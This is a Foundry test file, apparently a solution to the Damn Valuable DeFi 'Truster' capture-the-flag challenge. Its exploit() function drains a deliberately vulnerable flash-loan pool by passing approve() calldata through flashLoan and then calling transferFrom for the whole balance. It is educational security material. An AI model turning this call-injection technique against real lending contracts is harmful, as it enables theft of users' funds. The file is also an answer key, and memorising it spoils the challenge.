// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {stdError} from "forge-std/stdlib.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../DamnValuableToken.sol";
import "../../truster/TrusterLenderPool.sol";

contract TrusterTest is BaseTest {

    // Pool has 1000000 ETH in balance
    uint TOKENS_IN_POOL = 1000000 ether;

    DamnValuableToken token;
    TrusterLenderPool pool;

    address payable attacker;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        token = new DamnValuableToken();
        vm.label(address(token), "DamnValuableToken");
        pool = new TrusterLenderPool(address(token));
        vm.label(address(pool), "TrusterLenderPool");


        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), 0);
    }

    
    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        uint256 poolBalance = token.balanceOf(address(pool));

        // Act as the attacker
        vm.prank(attacker);
        // make the pool approve the attacker to manage the whole pool balance while taking a free loan
        bytes memory attackCallData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
        pool.flashLoan(0, attacker, address(token), attackCallData);

        // now steal all the funds
        vm.prank(attacker);
        token.transferFrom(address(pool), attacker, poolBalance);
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
